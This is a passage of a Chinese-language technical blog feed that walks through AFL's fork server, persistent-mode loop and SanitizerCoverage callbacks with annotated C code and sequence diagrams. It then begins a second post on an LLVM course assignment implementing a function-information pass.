class="comment">/* If we&#x27;re running under AFL, attach to the appropriate region, replacing the</span></span><br><span class="line"><span class="comment">     early-stage __afl_area_initial region that is needed to allow some really</span></span><br><span class="line"><span class="comment">     hacky .init code to work correctly in projects such as OpenSSL. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (id_str) &#123;</span><br><span class="line"></span><br><span class="line">    u32 shm_id = <span class="built_in">atoi</span>(id_str);<span class="comment">// 获取环境变量中的共享内存ID</span></span><br><span class="line"></span><br><span class="line">    __afl_area_ptr = <span class="built_in">shmat</span>(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);<span class="comment">// 转换字符串为整数ID</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Whooooops. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__afl_area_ptr == (<span class="keyword">void</span> *)<span class="number">-1</span>) _exit(<span class="number">1</span>);<span class="comment">// 错误处理</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write something into the bitmap so that even with low AFL_INST_RATIO,</span></span><br><span class="line"><span class="comment">       our parent doesn&#x27;t give up on us. */</span></span><br><span class="line"></span><br><span class="line">    __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">// 初始化第一个字节，防止父进程误判</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="afl-start-forkserver"><a href="#afl-start-forkserver" class="headerlink" title="__afl_start_forkserver"></a>__afl_start_forkserver</h4><p><code>__afl_start_forkserver</code> 是 AFL（American Fuzzy Lop）模糊测试工具的核心组件之一，它实现了高效的 fork 服务器机制。这个函数的主要作用是创建一个长期运行的服务器进程，负责管理目标程序的执行，从而避免重复的进程创建开销。</p><ol><li>初始化与握手</li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> u8 tmp[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, tmp, <span class="number">4</span>) != <span class="number">4</span>) <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><ul><li>通过状态管道（<code>FORKSRV_FD + 1</code>）向 AFL 父进程发送 4 字节任意数据</li><li>这是 fork 服务器的启动信号，告知 AFL “我已准备就绪”</li><li>如果写失败，说明不需要 fork 服务器，直接返回执行目标程</li></ul><ol start="2"><li>主循环 - 处理测试用例</li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(FORKSRV_FD, &amp;was_killed, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>阻塞读取控制管道（<code>FORKSRV_FD</code>），等待 AFL 发送测试用例</li><li><code>was_killed</code> 表示上一个子进程是否被 AFL 终止（超时等情况）</li></ul><ol start="3"><li><p>子进程管理</p><table><thead><tr><th><code>child_stopped</code> 值</th><th>子进程状态</th><th>可能场景</th><th>下一步动作</th></tr></thead><tbody><tr><td><strong>0</strong></td><td>没有暂停的子进程</td><td>1. 无子进程 2. 子进程正在运行</td><td>创建新进程 (<code>fork()</code>)</td></tr><tr><td><strong>1</strong></td><td>有子进程处于暂停状态 (SIGSTOP)</td><td>持久化模式等待唤醒</td><td>恢复进程 (<code>SIGCONT</code>)</td></tr></tbody></table><ol><li><p>处理持久化模式的竞态条件</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (child_stopped &amp;&amp; was_killed) &#123;</span><br><span class="line">    child_stopped = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">waitpid</span>(child_pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当子进程处于暂停状态但 AFL 已发出终止信号时</li><li>确保彻底结束前一个子进程，避免僵尸进程</li></ul></li><li><p>创建新进程（非持久化模式）</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!child_stopped) &#123;</span><br><span class="line">    child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (child_pid &lt; <span class="number">0</span>) _exit(<span class="number">1</span>);  <span class="comment">// fork 失败</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!child_pid) &#123;  <span class="comment">// 子进程分支</span></span><br><span class="line">        <span class="built_in">close</span>(FORKSRV_FD);</span><br><span class="line">        <span class="built_in">close</span>(FORKSRV_FD + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;  <span class="comment">// 跳出函数，执行目标程序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建新进程执行测试用例</li><li>子进程关闭通信管道后返回，继续执行被测试程序</li><li>父进程（fork 服务器）继续运行</li></ul></li><li><p>恢复持久化进程</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">kill</span>(child_pid, SIGCONT);</span><br><span class="line">    child_stopped = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>对于持久化模式，不创建新进程</li><li>向暂停的子进程发送 SIGCONT 唤醒它</li><li>重用同一个进程执行新测试用例</li></ul></li><li><p>与 AFL 通信</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 发送子进程 PID</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, &amp;child_pid, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待子进程结束</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">waitpid</span>(child_pid, &amp;status, is_persistent ? WUNTRACED : <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理持久化模式的暂停状态</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WIFSTOPPED</span>(status)) child_stopped = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送子进程状态</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, &amp;status, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><ol><li>将子进程 PID 发送给 AFL</li><li>等待子进程结束（或暂停）</li><li>检测持久化模式的暂停状态（SIGSTOP）</li><li>将子进程状态返回给 AFL</li></ol></li></ol><h5 id="通信管道说明"><a href="#通信管道说明" class="headerlink" title="通信管道说明"></a>通信管道说明</h5><table><thead><tr><th>文件描述符</th><th>方向</th><th>用途</th></tr></thead><tbody><tr><td>FORKSRV_FD</td><td>输入</td><td>接收 AFL 的测试用例和控制命令</td></tr><tr><td>FORKSRV_FD+1</td><td>输出</td><td>向 AFL 发送状态和结果信息</td></tr></tbody></table><h5 id="持久化-vs-非持久化模式"><a href="#持久化-vs-非持久化模式" class="headerlink" title="持久化 vs 非持久化模式"></a>持久化 vs 非持久化模式</h5><h6 id="非持久化模式（默认）"><a href="#非持久化模式（默认）" class="headerlink" title="非持久化模式（默认）"></a>非持久化模式（默认）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant A as AFL</span><br><span class="line">    participant F as Fork 服务器</span><br><span class="line">    participant C as 子进程</span><br><span class="line">    </span><br><span class="line">    A-&gt;&gt;F: 发送测试用例</span><br><span class="line">    F-&gt;&gt;C: fork()</span><br><span class="line">    C-&gt;&gt;F: 执行测试</span><br><span class="line">    F-&gt;&gt;A: 返回PID和状态</span><br><span class="line">    C--&gt;&gt;F: 进程结束</span><br><span class="line">    F-&gt;&gt;A: 通知结束状态</span><br></pre></td></tr></table></figure><h6 id="持久化模式"><a href="#持久化模式" class="headerlink" title="持久化模式"></a>持久化模式</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant A as AFL</span><br><span class="line">    participant F as Fork 服务器</span><br><span class="line">    participant C as 持久化进程</span><br><span class="line">    </span><br><span class="line">    A-&gt;&gt;F: 发送测试用例1</span><br><span class="line">    F-&gt;&gt;C: SIGCONT</span><br><span class="line">    C-&gt;&gt;F: 执行测试1</span><br><span class="line">    C-&gt;&gt;F: SIGSTOP（暂停）</span><br><span class="line">    F-&gt;&gt;A: 返回状态</span><br><span class="line">    </span><br><span class="line">    A-&gt;&gt;F: 发送测试用例2</span><br><span class="line">    F-&gt;&gt;C: SIGCONT</span><br><span class="line">    C-&gt;&gt;F: 执行测试2</span><br><span class="line">    C-&gt;&gt;F: SIGSTOP（暂停）</span><br><span class="line">    F-&gt;&gt;A: 返回状态</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __afl_start_forkserver(<span class="keyword">void</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> u8 tmp[<span class="number">4</span>];<span class="comment">// 临时缓冲区</span></span><br><span class="line">  s32 child_pid;<span class="comment">// 子进程PID</span></span><br><span class="line"></span><br><span class="line">  u8  child_stopped = <span class="number">0</span>;<span class="comment">// 子进程停止状态标志,若为1表示有子进程可以唤醒</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phone home and tell the parent that we&#x27;re OK. If parent isn&#x27;t there,</span></span><br><span class="line"><span class="comment">     assume we&#x27;re not running in forkserver mode and just execute program. */</span></span><br><span class="line">    <span class="comment">// 通过状态管道通知父进程准备就绪</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, tmp, <span class="number">4</span>) != <span class="number">4</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 主循环处理测试用例</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u32 was_killed;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wait for parent by reading from the pipe. Abort if read fails. */</span></span><br><span class="line">    <span class="comment">// 等待父进程发送测试用例</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(FORKSRV_FD, &amp;was_killed, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we stopped the child in persistent mode, but there was a race</span></span><br><span class="line"><span class="comment">       condition and afl-fuzz already issued SIGKILL, write off the old</span></span><br><span class="line"><span class="comment">       process. */</span></span><br><span class="line">    <span class="comment">// 处理持久化模式下的竞态条件</span></span><br><span class="line">    <span class="keyword">if</span> (child_stopped &amp;&amp; was_killed) &#123;</span><br><span class="line">      child_stopped = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">waitpid</span>(child_pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!child_stopped) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Once woken up, create a clone of our process. */</span></span><br><span class="line">      <span class="comment">// 创建子进程进行模糊测试</span></span><br><span class="line">      child_pid = fork();</span><br><span class="line">      <span class="keyword">if</span> (child_pid &lt; <span class="number">0</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* In child process: close fds, resume execution. */</span></span><br><span class="line">      <span class="comment">// 子进程分支</span></span><br><span class="line">      <span class="keyword">if</span> (!child_pid) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">close</span>(FORKSRV_FD);<span class="comment">// 关闭不必要的文件描述符</span></span><br><span class="line">        <span class="built_in">close</span>(FORKSRV_FD + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;               <span class="comment">// 返回目标程序继续执行</span></span><br><span class="line">  </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Special handling for persistent mode: if the child is alive but</span></span><br><span class="line"><span class="comment">         currently stopped, simply restart it with SIGCONT. */</span></span><br><span class="line">      <span class="comment">// 恢复被暂停的持久化进程</span></span><br><span class="line">      <span class="built_in">kill</span>(child_pid, SIGCONT);</span><br><span class="line">      child_stopped = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In parent process: write PID to pipe, then wait for child. */</span></span><br><span class="line">    <span class="comment">// 向父进程发送子进程PID</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, &amp;child_pid, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line">     <span class="comment">// 等待子进程完成</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">waitpid</span>(child_pid, &amp;status, is_persistent ? WUNTRACED : <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In persistent mode, the child stops itself with SIGSTOP to indicate</span></span><br><span class="line"><span class="comment">       a successful run. In this case, we want to wake it up without forking</span></span><br><span class="line"><span class="comment">       again. */</span></span><br><span class="line">    <span class="comment">// 处理持久化模式的暂停状态</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WIFSTOPPED</span>(status)) child_stopped = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Relay wait status to pipe, then loop back. */</span></span><br><span class="line">    <span class="comment">// 向父进程发送子进程状态</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(FORKSRV_FD + <span class="number">1</span>, &amp;status, <span class="number">4</span>) != <span class="number">4</span>) _exit(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="afl-persistent-loop"><a href="#afl-persistent-loop" class="headerlink" title="__afl_persistent_loop"></a>__afl_persistent_loop</h3><ol><li>初次代码调用</li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> u8 first_pass = <span class="number">1</span>;  <span class="comment">// 静态变量，保持跨调用状态</span></span><br><span class="line"><span class="keyword">static</span> u32 cycle_cnt;      <span class="comment">// 循环计数器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (first_pass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_persistent) &#123;</span><br><span class="line">        <span class="comment">// 重置覆盖率记录</span></span><br><span class="line">        <span class="built_in">memset</span>(__afl_area_ptr, <span class="number">0</span>, MAP_SIZE);  <span class="comment">// 清零整个共享内存区域</span></span><br><span class="line">        __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;  <span class="comment">// 设置&quot;存活标志&quot;，防止父进程误判</span></span><br><span class="line">        __afl_prev_loc = <span class="number">0</span>;     <span class="comment">// 重置基本块追踪状态</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cycle_cnt = max_cnt;  <span class="comment">// 设置最大迭代次数</span></span><br><span class="line">    first_pass = <span class="number">0</span>;       <span class="comment">// 标记初始化完成</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;             <span class="comment">// 指示进入循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>持久化循环主体</li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_persistent) &#123;</span><br><span class="line">    <span class="keyword">if</span> (--cycle_cnt) &#123;  <span class="comment">// 递减计数器并检查是否继续</span></span><br><span class="line">        <span class="built_in">raise</span>(SIGSTOP);  <span class="comment">// ★ 核心：暂停进程等待新输入</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 状态重置</span></span><br><span class="line">        __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;   <span class="comment">// 设置存活标志</span></span><br><span class="line">        __afl_prev_loc = <span class="number">0</span>;      <span class="comment">// 重置基本块追踪</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// 继续循环</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>退出循环处理</li></ol><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    __afl_area_ptr = __afl_area_initial;  <span class="comment">// 切换回虚拟内存区域</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 终止循环</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant C as 目标程序</span><br><span class="line">    participant F as Fork服务器</span><br><span class="line">    participant A as AFL模糊器</span><br><span class="line">    </span><br><span class="line">    Note over C: 首次调用</span><br><span class="line">    C-&gt;&gt;C: 初始化覆盖率</span><br><span class="line">    C-&gt;&gt;F: 返回1 (继续循环)</span><br><span class="line">    </span><br><span class="line">    Note over C: 迭代1</span><br><span class="line">    C-&gt;&gt;A: 执行测试用例1</span><br><span class="line">    C-&gt;&gt;F: raise(SIGSTOP)</span><br><span class="line">    F-&gt;&gt;A: 报告暂停</span><br><span class="line">    A-&gt;&gt;F: 发送测试用例2</span><br><span class="line">    F-&gt;&gt;C: SIGCONT</span><br><span class="line">    C-&gt;&gt;C: 重置状态</span><br><span class="line">    </span><br><span class="line">    Note over C: 迭代2</span><br><span class="line">    C-&gt;&gt;A: 执行测试用例2</span><br><span class="line">    C-&gt;&gt;F: raise(SIGSTOP)</span><br><span class="line">    F-&gt;&gt;A: 报告暂停</span><br><span class="line">    A-&gt;&gt;F: 发送测试用例3</span><br><span class="line">    F-&gt;&gt;C: SIGCONT</span><br><span class="line">    C-&gt;&gt;C: 重置状态</span><br><span class="line">    </span><br><span class="line">    Note over C: 迭代3</span><br><span class="line">    C-&gt;&gt;A: 执行测试用例3</span><br><span class="line">    C-&gt;&gt;F: raise(SIGSTOP)</span><br><span class="line">    F-&gt;&gt;A: 报告暂停</span><br><span class="line">    </span><br><span class="line">    Note over C: 循环结束</span><br><span class="line">    A-&gt;&gt;F: 发送退出信号</span><br><span class="line">    F-&gt;&gt;C: SIGCONT</span><br><span class="line">    C-&gt;&gt;C: 切换内存区域</span><br><span class="line">    C-&gt;&gt;F: 返回0 (退出循环)</span><br></pre></td></tr></table></figure><h4 id="目标程序中的集成"><a href="#目标程序中的集成" class="headerlink" title="目标程序中的集成"></a>目标程序中的集成</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AFL持久化循环</span></span><br><span class="line"><span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line">    <span class="comment">/* 用户负责重置程序状态 */</span></span><br><span class="line">    <span class="built_in">reset_global_variables</span>();</span><br><span class="line">    <span class="built_in">close_open_files</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 读取输入 */</span></span><br><span class="line">    <span class="keyword">size_t</span> len = <span class="built_in">read</span>(<span class="number">0</span>, buf, BUF_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 测试核心逻辑 */</span></span><br><span class="line">    <span class="built_in">test_function</span>(buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 后续代码不会记录覆盖率 */</span></span><br><span class="line"><span class="built_in">cleanup_resources</span>();</span><br></pre></td></tr></table></figure><h3 id="SanitizerCoverage-回调函数"><a href="#SanitizerCoverage-回调函数" class="headerlink" title="SanitizerCoverage 回调函数"></a>SanitizerCoverage 回调函数</h3><h4 id="sanitizer-cov-trace-pc-guard：覆盖率追踪回调"><a href="#sanitizer-cov-trace-pc-guard：覆盖率追踪回调" class="headerlink" title="__sanitizer_cov_trace_pc_guard：覆盖率追踪回调"></a>__sanitizer_cov_trace_pc_guard：覆盖率追踪回调</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __sanitizer_cov_trace_pc_guard(<span class="keyword">uint32_t</span>* guard) &#123;</span><br><span class="line">  __afl_area_ptr[*guard]++;<span class="comment">// 增加对应位置的计数器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sanitizer-cov-trace-pc-guard-init：插桩点初始化"><a href="#sanitizer-cov-trace-pc-guard-init：插桩点初始化" class="headerlink" title="__sanitizer_cov_trace_pc_guard_init：插桩点初始化"></a>__sanitizer_cov_trace_pc_guard_init：插桩点初始化</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="keyword">uint32_t</span>* start, <span class="keyword">uint32_t</span>* stop) &#123;</span><br><span class="line"></span><br><span class="line">  u32 inst_ratio = <span class="number">100</span>;<span class="comment">// 默认插桩比例</span></span><br><span class="line">  u8* x;</span><br><span class="line">  <span class="comment">// 跳过已初始化或空范围</span></span><br><span class="line">  <span class="keyword">if</span> (start == stop || *start) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 获取环境变量中的插桩比例</span></span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (x) inst_ratio = <span class="built_in">atoi</span>(x);</span><br><span class="line">  <span class="comment">// 验证比例有效性</span></span><br><span class="line">  <span class="keyword">if</span> (!inst_ratio || inst_ratio &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;[-] ERROR: Invalid AFL_INST_RATIO (must be 1-100).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that the first element in the range is always set - we use that</span></span><br><span class="line"><span class="comment">     to avoid duplicate calls (which can happen as an artifact of the underlying</span></span><br><span class="line"><span class="comment">     implementation in LLVM). */</span></span><br><span class="line">  <span class="comment">// 初始化第一个元素（防重复调用）</span></span><br><span class="line">  *(start++) = <span class="built_in">R</span>(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 遍历初始化所有guard</span></span><br><span class="line">  <span class="keyword">while</span> (start &lt; stop) &#123;</span><br><span class="line">    <span class="comment">// 按比例随机决定是否插桩</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) *start = <span class="built_in">R</span>(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> *start = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    start++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant C as 编译器(LLVM)</span><br><span class="line">    participant P as 目标程序</span><br><span class="line">    participant A as AFL运行时</span><br><span class="line">    </span><br><span class="line">    C-&gt;&gt;P: 编译时插入回调函数</span><br><span class="line">    P--&gt;&gt;A: 程序启动</span><br><span class="line">    A-&gt;&gt;P: 调用 __sanitizer_cov_trace_pc_guard_init</span><br><span class="line">    P-&gt;&gt;A: 初始化插桩点</span><br><span class="line">    loop 程序执行</span><br><span class="line">        P-&gt;&gt;A: 基本块执行时调用 __sanitizer_cov_trace_pc_guard</span><br><span class="line">        A-&gt;&gt;A: 更新共享内存计数器</span><br><span class="line">    end</span><br><span class="line">    A--&gt;&gt;AFL: 分析覆盖率数据</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSCD70 2023s Assignment1 Introduction to LLVM 记录</title>
      <link href="/2025/07/01/CSCD70%202023s%20Assignment%201%20Introduction%20to%20LLVM%20%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/07/01/CSCD70%202023s%20Assignment%201%20Introduction%20to%20LLVM%20%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="CSCD70-2023s-Assignment1-Introduction-to-LLVM-记录"><a href="#CSCD70-2023s-Assignment1-Introduction-to-LLVM-记录" class="headerlink" title="CSCD70 2023s Assignment1 Introduction to LLVM 记录"></a>CSCD70 2023s Assignment1 Introduction to LLVM 记录</h1><p>这里我只附上代码和效果哈，具体的实验要求和过程看这个<a href="https://www.overleaf.com/read/nvmnmbntgwqn">链接</a></p><h2 id="FunctionInfo"><a href="#FunctionInfo" class="headerlink" title="FunctionInfo"></a>FunctionInfo</h2><p>这个函数主要是收集信息，主要是打印对齐需要注意一下</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm/Passes/PassBuilder.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm/Passes/PassPlugin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm/Support/raw_ostream.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInfoPass</span> <span class="keyword">final</span> :</span> <span class="keyword">public</span> PassInfoMixin&lt;FunctionInfoPass&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">PreservedAnalyses <span class="title">run</span><span class="params">([[maybe_unused]] Module &amp;M, ModuleAnalysisManager &amp;)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;CSCD70 Function Information Pass&quot;</span></span><br><span class="line">           &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;-----------------------------------------------------------------\n&quot;</span>;</span><br><span class="line">    <span class="built_in">outs</span>()&lt;&lt;formatv(<span class="string">&quot;&#123;0,=20&#125;&#123;1,=10&#125;&#123;2,=10&#125;&#123;3,=10&#125;&#123;4,=10&#125;\n&quot;</span>,<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;#Args&quot;</span>,<span class="string">&quot;#Calls&quot;</span>,<span class="string">&quot;#Blocks&quot;</span>,<span class="string">&quot;#Insts&quot;</span>);</span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;-----------------------------------------------------------------\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(Function &amp;F : M)&#123;</span><br><span class="line">      <span class="keyword">if</span>(F.<span class="built_in">isDeclaration</span>()) <span class="keyword">continue</span>;<span class="comment">//跳过函数声明</span></span><br><span class="line">            <span class="built_in">analyzeFunction</span>(F);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;-----------------------------------------------------------------\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">analyzeFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    StringRef funcName = F.<span class="built_in">getName</span>();<span class="comment">//获取函数名</span></span><br><span class="line">    <span class="keyword">unsigned</span> argNum = F.<span class="built_in">arg_size</span>();<span class="comment">//获取参数个数</span></span><br><span class="line">    <span class="keyword">unsigned</span> callNum = F.<span class="built_in">getNumUses</span>();<span class="comment">//获取被调用次数</span></span><br><span class="line">    <span class="keyword">unsigned</span> bbNum = F.<span class="built_in">size</span>();<span class="comment">//基本块个数</span></span><br><span class="line">    <span class="keyword">unsigned</span> instrNum = F.<span class="built_in">getInstructionCount</span>();<span class="comment">//指令总数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; formatv(<span class="string">&quot;&#123;0,=20&#125;&#123;1,=10&#125;&#123;2,=10&#125;&#123;3,=10&#125;&#123;4,=10&#125;\n&quot;</span>,</span><br><span class="line">                 funcName, </span><br><span class="line">                 argNum, </span><br><span class="line">                 callNum, </span><br><span class="line">                 bbNum, </span><br><span class="line">                 instrNum);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// class FunctionInfoPass</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span 